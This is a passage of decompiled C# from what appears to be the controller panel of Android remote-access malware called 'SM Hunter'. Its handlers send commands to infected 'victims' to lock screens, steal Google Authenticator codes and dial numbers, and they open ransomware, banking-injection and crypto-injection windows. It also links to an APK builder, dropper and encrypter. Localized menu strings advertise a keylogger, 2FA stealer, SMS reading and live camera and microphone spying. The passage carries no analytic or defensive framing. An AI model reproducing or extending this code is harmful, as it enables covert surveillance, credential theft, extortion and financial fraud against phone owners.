									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x00086AFC File Offset: 0x00084CFC
		private void drakeUIButtonIcon36_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LKeb",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x00002423 File Offset: 0x00000623
		private void Guna2GradientButton20_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x000038C9 File Offset: 0x00001AC9
		private void ClientsButton_Click(object sender, EventArgs e)
		{
			this.ClientsWindow.BringToFront();
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x000038D6 File Offset: 0x00001AD6
		private void ClientsLogs_Click(object sender, EventArgs e)
		{
			this.DataLog.BringToFront();
			this.DataLog.Visible = true;
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x000038EF File Offset: 0x00001AEF
		private void guna2GradientButton3_Click(object sender, EventArgs e)
		{
			this.DGVblocked.BringToFront();
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x000038FC File Offset: 0x00001AFC
		private void guna2GradientButton4_Click(object sender, EventArgs e)
		{
			Process.Start("https://telegram.me/russagent");
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x00002423 File Offset: 0x00000623
		private void Guna2GradientButton22_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x00049C80 File Offset: 0x00047E80
		private void panel1_MouseDown_1(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Codes.ReleaseCapture();
					Codes.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000536 RID: 1334 RVA: 0x00086CC8 File Offset: 0x00084EC8
		private void guna2GradientButton5_Click(object sender, EventArgs e)
		{
			ApkBuilder apkBuilder = new ApkBuilder();
			apkBuilder.Show();
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000538 RID: 1336 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void Guna2Button5_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000539 RID: 1337 RVA: 0x00002D24 File Offset: 0x00000F24
		private void PictureBox9_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x0600053A RID: 1338 RVA: 0x00002423 File Offset: 0x00000623
		private void LiveScreenControlToolsTrip_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600053B RID: 1339 RVA: 0x00086CE4 File Offset: 0x00084EE4
		private void INSTALLEDAPPS()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".apps",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Apps,
										Data.SPL_SOCKET,
										"apps"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600053C RID: 1340 RVA: 0x0006403C File Offset: 0x0006223C
		private void DIALNUMBER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								CallPhone callPhone = new CallPhone();
								callPhone.L0.Text = "add Number";
								callPhone.StartPosition = FormStartPosition.Manual;
								callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
								if (callPhone.ShowDialog() == DialogResult.OK)
								{
									string text = callPhone.TextBox1.Text;
									string call = callPhone._Call;
									callPhone.Close();
									if (Operators.CompareString(text, null, false) != 0)
									{
										if (client != null)
										{
											object[] array = new object[]
											{
												myClient,
												string.Concat(new string[]
												{
													SecurityKey.KeysClient1,
													Data.SPL_SOCKET,
													reso.domen,
													".info",
													Data.SPL_SOCKET,
													"method",
													Data.SPL_SOCKET,
													SecurityKey.resultClient,
													Data.SPL_SOCKET,
													call,
													Data.SPL_DATA,
													"tel:",
													text.Trim()
												}),
												Codes.Encoding().GetBytes("null"),
												client
											};
											client.SendMessage(array);
										}
									}
								}
								else
								{
									callPhone.Close();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600053D RID: 1341 RVA: 0x00064A0C File Offset: 0x00062C0C
		private void NOTIFICATIONMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Notifications_" + client.ClientAddressIP;
								if ((Eaglepopup)MyProject.Application.OpenForms[text] == null)
								{
									new Eaglepopup
									{
										Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
										ClassClient = client
									}.Show();
									dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600053E RID: 1342 RVA: 0x00086E58 File Offset: 0x00085058
		private void AUTOUNLOCKSCREEN()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LKeb",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600053F RID: 1343 RVA: 0x00087010 File Offset: 0x00085210
		private void AUTHSTEALER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"goauth<*>X",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000540 RID: 1344 RVA: 0x000036C2 File Offset: 0x000018C2
		private void drakeUIAvatar13_Click(object sender, EventArgs e)
		{
			this.FormEventArgsClosing();
		}

		// Token: 0x06000541 RID: 1345 RVA: 0x00066398 File Offset: 0x00064598
		private void guna2GradientButton4_Click_1(object sender, EventArgs e)
		{
			if (this.ST == null)
			{
				this.ST = new Apk_studio();
				DialogResult dialogResult = this.ST.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.ST.Close();
					this.ST = null;
					return;
				}
				this.ST.Close();
				this.ST = null;
			}
		}

		// Token: 0x06000542 RID: 1346 RVA: 0x00068954 File Offset: 0x00066B54
		private void guna2GradientButton6_Click(object sender, EventArgs e)
		{
			if (this.DR == null)
			{
				this.DR = new Drooper();
				DialogResult dialogResult = this.DR.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.DR.Close();
					this.DR = null;
					return;
				}
				this.DR.Close();
				this.DR = null;
			}
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x000871C8 File Offset: 0x000853C8
		private void guna2GradientButton3_Click_1(object sender, EventArgs e)
		{
			Form1 form = new Form1();
			form.Show();
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x000871E4 File Offset: 0x000853E4
		private void guna2GradientButton7_Click(object sender, EventArgs e)
		{
			ApkDexEncrypter apkDexEncrypter = new ApkDexEncrypter();
			apkDexEncrypter.Show();
		}

		// Token: 0x06000545 RID: 1349 RVA: 0x00003909 File Offset: 0x00001B09
		private void guna2GradientButton9_Click(object sender, EventArgs e)
		{
			Process.Start("https://t.me/SystemAdminServer");
		}

		// Token: 0x06000546 RID: 1350 RVA: 0x00087200 File Offset: 0x00085400
		private void CLICKTOUNLOCK()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "lockscreen_" + client.ClientAddressIP;
								if ((Lockscreen)MyProject.Application.OpenForms[text] == null)
								{
									new Lockscreen
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "SM Hunter", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000547 RID: 1351 RVA: 0x00087374 File Offset: 0x00085574
		private void RANSOMEWARE()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "ransomeware_" + client.ClientAddressIP;
								if ((Ransomeware)MyProject.Application.OpenForms[text] == null)
								{
									new Ransomeware
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "SM Hunter", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000548 RID: 1352 RVA: 0x000874E8 File Offset: 0x000856E8
		private void BANKINGINJECTION()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "bankingInjections" + client.ClientAddressIP;
								if ((BankingInjections)MyProject.Application.OpenForms[text] == null)
								{
									new BankingInjections
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "SM Hunter", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000549 RID: 1353 RVA: 0x000871C8 File Offset: 0x000853C8
		private void guna2GradientButton8_Click(object sender, EventArgs e)
		{
			Form1 form = new Form1();
			form.Show();
		}

		// Token: 0x0600054A RID: 1354 RVA: 0x0008762C File Offset: 0x0008582C
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x0600054B RID: 1355 RVA: 0x000876AC File Offset: 0x000858AC
		private void UpdateEnglish()
		{
			this.lang.Text = "Language";
			this.LiveScreenControlToolsTrip.Text = " Live Screen Control";
			this.LiveCameraStreamToolsTrip.Text = " Live camera";
			this.LiveMicrophoneToolsTrip.Text = " Microphone Access";
			this.KeyloggerToolsTrip.Text = " Keylogger";
			this.ScreenLoggerToolsTrip.Text = " Screen Text Logger";
			this.ScreenReaderToolsTrip.Text = " Screen Reader";
			this.LiveLocationToolsTrip.Text = " Live Location";
			this.FileManagerToolsTrip.Text = " Files Manager";
			this.CallsHistoryToolsTrip.Text = "Calls History";
			this.WebviewToolsTrip.Text = " Banking Injection";
			this.toolStripMenuItem28.Text = " Dial a number";
			this.ReadSmssToolsTrip.Text = " Read SMS";
			this.ContactsListToolsTrip.Text = " Contacts List";
			this.CryptoClipperToolsTrip.Text = " Clipboard";
			this.Steal2FaCodeToolsTrip.Text = " 2FA Stealer";
			this.toolStripMenuItem29.Text = " Command Terminal";
			this.InstalledApplicationsToolsTrip.Text = " Installed Apps";
			this.toolStripMenuItem30.Text = " Lock Screen";
			this.toolStripMenuItem31.Text = " Unlock Screen";
			this.toolStripMenuItem32.Text = " Show Toast Message";
			this.toolStripMenuItem26.Text = " Request Admin Rights";
			this.toolStripMenuItem27.Text = " Request Permissions";
			this.NotificationsReaderToolsTrip.Text = " Read Notifications";
			this.ShowRegisteredEmailsToolsTrip.Text = " Accounts / Emails List";
			this.OpenLinkToolsTrip.Text = " Open a Target Link";
			this.SelfDestructVirusToolsTrip.Text = " Self Destruct Virus";
			this.ConnectionsToolsTrip.Text = " Connections";
			this.ClienttFolderToolsTrip.Text = " Client Data Folder";
			this.RestartToolsTrip.Text = " Restart Connection";
			this.KillAppsToolsTrip.Text = "Allow to delete app";
			this.homebtn.Text = "Home";
			this.logbtn.Text = "Logs";
			this.buildbtn.Text = "Build";
			this.injectbtn.Text = "Injector";
			this.Toolsbtn.Text = "Tools";
			this.dropbtn.Text = "Dropper";
			this.supportbtn.Text = "Support";
			this.aboutbtn.Text = "About";
			this.encryptbtn.Text = "Encrypt";
			this.drakeUIButtonIcon40.Text = "Live screen";
			this.drakeUIButtonIcon41.Text = "Camera";
			this.drakeUIButtonIcon51.Text = "SMS";
			this.drakeUIButtonIcon62.Text = "Files";
			this.drakeUIButtonIcon43.Text = "Applications";
			this.drakeUIButtonIcon73.Text = "Ransomeware";
			this.drakeUIButtonIcon65.Text = "Reader";
			this.drakeUIButtonIcon47.Text = "Calls";
			this.drakeUIButtonIcon64.Text = "Lock";
			this.drakeUIButtonIcon46.Text = "Microphone";
			this.drakeUIButtonIcon49.Text = "Logger";
			this.drakeUIButtonIcon42.Text = "Contacts";
			this.drakeUIButtonIcon48.Text = "Clipper";
			this.drakeUIButtonIcon63.Text = "Unlock";
			this.drakeUIButtonIcon67.Text = "Mute";
			this.drakeUIButtonIcon50.Text = "Keylogger";
			this.drakeUIButtonIcon44.Text = "Location";
			this.drakeUIButtonIcon68.Text = "Open Link";
			this.drakeUIButtonIcon83.Text = "Unlock Keys";
			this.drakeUIButtonIcon70.Text = "Toast";
			this.drakeUIButtonIcon71.Text = "Accounts";
			this.drakeUIButtonIcon77.Text = "Admin";
			this.drakeUIButtonIcon75.Text = "Self Delete";
			this.drakeUIButtonIcon76.Text = "Permissions";
			this.drakeUIButtonIcon82.Text = "Banking injection";
			this.drakeUIButtonIcon74.Text = "Crypto injection";
			this.drakeUIButtonIcon56.Text = "Dial a number";
			this.drakeUIButtonIcon61.Text = "Notifications";
			this.drakeUIButtonIcon69.Text = "G-Auth Stealer";
			this.drakeUILabel2.Text = "CPU : 0.000%";
			this.label12.Text = "Samsung S20 Ultra";
			this.label43.Text = "CryptoCurrency Grabber :";
			this.label38.Text = "Unknown Devices";
			this.label2.Text = "Active Devices";
			this.label3.Text = "Notifications";
			this.label13.Text = "Server";
			this.label1.Text = "VICTIMS";
			this.Start.HeaderText = "Start/Stop";
			this.DataGridViewTextBoxColumn6.HeaderText = "Status";
			this.portnam.HeaderText = "Port";
			this.tabPage1.Text = "Quick Option";
			this.tabPage2.Text = "Clients Information";
		}

		// Token: 0x0600054C RID: 1356 RVA: 0x00087BDC File Offset: 0x00085DDC
		private void UpdateRussian()
		{
			this.lang.Text = "Язык";
			this.LiveScreenControlToolsTrip.Text = " Управление живым экраном";
			this.LiveCameraStreamToolsTrip.Text = " Живая камера";
			this.LiveMicrophoneToolsTrip.Text = " Доступ к микрофону";
			this.KeyloggerToolsTrip.Text = " Ключевой регистратор";
			this.ScreenLoggerToolsTrip.Text = " Логгер текста экрана";
			this.ScreenReaderToolsTrip.Text = " Скринридер";
			this.LiveLocationToolsTrip.Text = " Живое местоположение";
			this.FileManagerToolsTrip.Text = " Менеджер файлов";
			this.CallsHistoryToolsTrip.Text = " История вызовов";
			this.WebviewToolsTrip.Text = " Банковская инъекция";
			this.toolStripMenuItem28.Text = " Набор номера";
			this.ReadSmssToolsTrip.Text = " Чтение SMS";
			this.ContactsListToolsTrip.Text = " Список контактов";
			this.CryptoClipperToolsTrip.Text = " Буфер обмена";
			this.Steal2FaCodeToolsTrip.Text = " 2FA краден";
			this.toolStripMenuItem29.Text = " Командный терминал";
			this.InstalledApplicationsToolsTrip.Text = " Установленные приложения";
			this.toolStripMenuItem30.Text = " Блокировка экрана";
			this.toolStripMenuItem31.Text = " Разблокировка экрана";
			this.toolStripMenuItem32.Text = " Показать уведомление";
			this.toolStripMenuItem26.Text = " Запрос прав администратора";
			this.toolStripMenuItem27.Text = " Запрос разрешений";
			this.NotificationsReaderToolsTrip.Text = " Чтение уведомлений";
			this.ShowRegisteredEmailsToolsTrip.Text = " Список аккаунтов / почт";
			this.OpenLinkToolsTrip.Text = " Открыть целевую ссылку";
			this.SelfDestructVirusToolsTrip.Text = " Самоуничтожение вируса";
			this.ConnectionsToolsTrip.Text = " Соединения";
			this.ClienttFolderToolsTrip.Text = " Папка данных клиента";
			this.RestartToolsTrip.Text = "Перезагрузить соединение";
			this.KillAppsToolsTrip.Text = "Разрешить удаление приложения";
			this.homebtn.Text = "Главная";
			this.logbtn.Text = "Журналы";
			this.buildbtn.Text = "Сборка";
			this.injectbtn.Text = "Инжектор";
			this.supportbtn.Text = "Поддержка";
			this.aboutbtn.Text = "О нас";
			this.Toolsbtn.Text = "Инструменты";
			this.dropbtn.Text = "Дроппер";
			this.encryptbtn.Text = "Зашифровать";
			this.DataGridViewTextBoxColumn6.HeaderText = "Статус";
			this.drakeUIButtonIcon40.Text = "Прямой эфир";
			this.drakeUIButtonIcon41.Text = "Камера";
			this.drakeUIButtonIcon51.Text = "SMS";
			this.drakeUIButtonIcon62.Text = "Файлы";
			this.drakeUIButtonIcon43.Text = "Приложения";
			this.drakeUIButtonIcon73.Text = "Вымогательство";
			this.drakeUIButtonIcon65.Text = "Читатель";
			this.drakeUIButtonIcon47.Text = "Звонки";
			this.drakeUIButtonIcon64.Text = "Блокировка";
			this.drakeUIButtonIcon46.Text = "Микрофон";
			this.drakeUIButtonIcon49.Text = "Логгер";
			this.drakeUIButtonIcon42.Text = "Контакты";
			this.drakeUIButtonIcon48.Text = "Клиппер";
			this.drakeUIButtonIcon63.Text = "Разблокировка";
			this.drakeUIButtonIcon67.Text = "Отключить";
			this.drakeUIButtonIcon50.Text = "Кейлоггер";
			this.drakeUIButtonIcon44.Text = "Местоположение";
			this.drakeUIButtonIcon68.Text = "Открыть ссылку";
			this.drakeUIButtonIcon83.Text = "Ключи разблокировки";
			this.drakeUIButtonIcon70.Text = "Тост";
			this.drakeUIButtonIcon71.Text = "Аккаунты";
			this.drakeUIButtonIcon77.Text = "Админ";
			this.drakeUIButtonIcon75.Text = "Самоудаление";
			this.drakeUIButtonIcon76.Text = "Разрешения";
			this.drakeUIButtonIcon82.Text = "Банковская инъекция";
			this.drakeUIButtonIcon74.Text = "Шифрование инъекция";
			this.drakeUIButtonIcon56.Text = "Набрать номер";
			this.drakeUIButtonIcon61.Text = "Уведомления";
			this.drakeUIButtonIcon69.Text = "Крадение G-Auth";
			this.drakeUILabel2.Text = "ЦП: 0.000%";
			this.label12.Text = "Samsung S20 Ultra";
			this.label43.Text = "Хвататель криптовалюты :";
			this.label38.Text = "Неизвестные устройства";
			this.label2.Text = "Активные устройства";
			this.label3.Text = "Уведомления";
			this.label13.Text = "Сервер";
			this.label1.Text = "Жертвы";
			this.Start.HeaderText = "Запуск/Остановка";
			this.portnam.HeaderText = "Порт";
			this.tabPage1.Text = "Быстрый выбор";
			this.tabPage2.Text = "Информация о клиентах";
		}

		// Token: 0x0600054D RID: 1357 RVA: 0x0008810C File Offset: 0x0008630C
		private void UpdateChinese()
		{
			this.lang.Text = "语言";
			this.LiveScreenControlToolsTrip.Text = " 实时屏幕控制";
			this.LiveCameraStreamToolsTrip.Text = " 实时摄像头";
			this.LiveMicrophoneToolsTrip.Text = " 麦克风访问";
			this.KeyloggerToolsTrip.Text = " 键盘记录器";
			this.ScreenLoggerToolsTrip.Text = " 屏幕文本记录器";
			this.ScreenReaderToolsTrip.Text = " 屏幕阅读器";
			this.LiveLocationToolsTrip.Text = " 实时位置";
			this.FileManagerToolsTrip.Text = " 文件管理器";
			this.CallsHistoryToolsTrip.Text = " 通话记录";
			this.WebviewToolsTrip.Text = " 银行注入";
			this.toolStripMenuItem28.Text = " 拨打电话";
			this.ReadSmssToolsTrip.Text = " 阅读短信";
			this.ContactsListToolsTrip.Text = " 联系人列表";
			this.CryptoClipperToolsTrip.Text = " 剪贴板";
			this.Steal2FaCodeToolsTrip.Text = " 2FA窃取";
			this.toolStripMenuItem29.Text = " 命令终端";
			this.InstalledApplicationsToolsTrip.Text = " 已安装应用";
			this.toolStripMenuItem30.Text = " 锁定屏幕";
			this.toolStripMenuItem31.Text = " 解锁屏幕";
			this.toolStripMenuItem32.Text = " 显示提示消息";
			this.toolStripMenuItem26.Text = " 请求管理员权限";
			this.toolStripMenuItem27.Text = " 请求权限";
			this.NotificationsReaderToolsTrip.Text = " 读取通知";
			this.ShowRegisteredEmailsToolsTrip.Text = " 账户/邮箱列表";
			this.OpenLinkToolsTrip.Text = " 打开目标链接";
			this.SelfDestructVirusToolsTrip.Text = " 自毁病毒";
			this.ConnectionsToolsTrip.Text = " 连接";
			this.ClienttFolderToolsTrip.Text = " 客户数据文件夹";
			this.RestartToolsTrip.Text = "重启连接";
			this.KillAppsToolsTrip.Text = "允许删除应用";
			this.homebtn.Text = "首页";
			this.logbtn.Text = "日志";
			this.buildbtn.Text = "构建";
			this.injectbtn.Text = "注入器";
			this.supportbtn.Text = "支持";
			this.aboutbtn.Text = "关于";
			this.Toolsbtn.Text = "工具";
			this.encryptbtn.Text = "加密";
			this.dropbtn.Text = "释放者";
			this.drakeUIButtonIcon40.Text = "实时屏幕";
			this.drakeUIButtonIcon41.Text = "相机";
			this.drakeUIButtonIcon51.Text = "短信";
			this.drakeUIButtonIcon62.Text = "文件";
			this.drakeUIButtonIcon43.Text = "应用程序";
			this.drakeUIButtonIcon73.Text = "勒索";
			this.drakeUIButtonIcon65.Text = "阅读器";
			this.drakeUIButtonIcon47.Text = "通话";
			this.drakeUIButtonIcon64.Text = "锁定";
			this.drakeUIButtonIcon46.Text = "麦克风";
			this.drakeUIButtonIcon49.Text = "记录器";
			this.drakeUIButtonIcon42.Text = "联系人";
			this.drakeUIButtonIcon48.Text = "剪贴板";
			this.drakeUIButtonIcon63.Text = "解锁";
			this.drakeUIButtonIcon67.Text = "静音";
			this.drakeUIButtonIcon50.Text = "键盘记录器";
			this.drakeUIButtonIcon44.Text = "位置";
			this.drakeUIButtonIcon68.Text = "打开链接";
			this.drakeUIButtonIcon83.Text = "解锁密钥";
			this.drakeUIButtonIcon70.Text = "弹出式提示";
			this.drakeUIButtonIcon71.Text = "账户";
			this.drakeUIButtonIcon77.Text = "管理员";
			this.drakeUIButtonIcon75.Text = "自毁";
			this.drakeUIButtonIcon76.Text = "权限";
			this.drakeUIButtonIcon82.Text = "银行注入";
			this.drakeUIButtonIcon74.Text = "加密注入";
			this.drakeUIButtonIcon56.Text = "拨打号码";
			this.drakeUIButtonIcon61.Text = "通知";
			this.drakeUIButtonIcon69.Text = "G-Auth窃取";
			this.drakeUILabel2.Text = "CPU：0.000%";
			this.label12.Text = "Samsung S20 Ultra";
			this.label43.Text = "加密货币抓取器：";
			this.label38.Text = "未知设备";
			this.label2.Text = "活跃设备";
			this.label3.Text = "通知";
			this.label13.Text = "服务器";
			this.label1.Text = "受害者";
			this.Start.HeaderText = "启动/停止";
			this.portnam.HeaderText = "端口";
			this.tabPage1.Text = "快速选项";
			this.tabPage2.Text = "客户信息";
			this.DataGridViewTextBoxColumn6.HeaderText = "状态";
		}

		// Token: 0x0600054E RID: 1358 RVA: 0x00002423 File Offset: 0x00000623
		private void servertoggle_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600054F RID: 1359 RVA: 0x0008863C File Offset: 0x0008683C
		private void drakeUIAvatar14_Click(object sender, EventArgs e)
		{
			ServerManager serverManager = new ServerManager();
			serverManager.Show();
		}

		// Token: 0x06000550 RID: 1360 RVA: 0x00088658 File Offset: 0x00086858
		private void aboutbtn_Click(object sender, EventArgs e)
		{
			About about = new About();
			about.Show();
		}

		// Token: 0x06000551 RID: 1361 RVA: 0x00002D24 File Offset: 0x00000F24
		private void drakeUIAvatar10_Click_1(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000552 RID: 1362 RVA: 0x00003916 File Offset: 0x00001B16
		private void WebviewToolsTrip_Click(object sender, EventArgs e)
		{
			this.CRYPTOINJECTION();
		}

		// Token: 0x06000553 RID: 1363 RVA: 0x0000391E File Offset: 0x00001B1E
		private void drakeUIButtonIcon40_Click(object sender, EventArgs e)
		{
			this.LIVESCREEN();
		}

		// Token: 0x06000554 RID: 1364 RVA: 0x00003926 File Offset: 0x00001B26
		private void drakeUIButtonIcon41_Click(object sender, EventArgs e)
		{
			this.CAMERAMANAGER();
		}

		// Token: 0x06000555 RID: 1365 RVA: 0x0000392E File Offset: 0x00001B2E
		private void drakeUIButtonIcon51_Click(object sender, EventArgs e)
		{
			this.SMSMANAGER();
		}

		// Token: 0x06000556 RID: 1366 RVA: 0x00003936 File Offset: 0x00001B36
		private void drakeUIButtonIcon62_Click(object sender, EventArgs e)
		{
			this.FILESMANAGER();
		}

		// Token: 0x06000557 RID: 1367 RVA: 0x0000393E File Offset: 0x00001B3E
		private void drakeUIButtonIcon43_Click(object sender, EventArgs e)
		{
			this.INSTALLEDAPPS();
		}

		// Token: 0x06000558 RID: 1368 RVA: 0x00003946 File Offset: 0x00001B46
		private void drakeUIButtonIcon73_Click(object sender, EventArgs e)
		{
			this.RANSOMEWARE();
		}

		// Token: 0x06000559 RID: 1369 RVA: 0x0000394E File Offset: 0x00001B4E
		private void drakeUIButtonIcon65_Click(object sender, EventArgs e)
		{
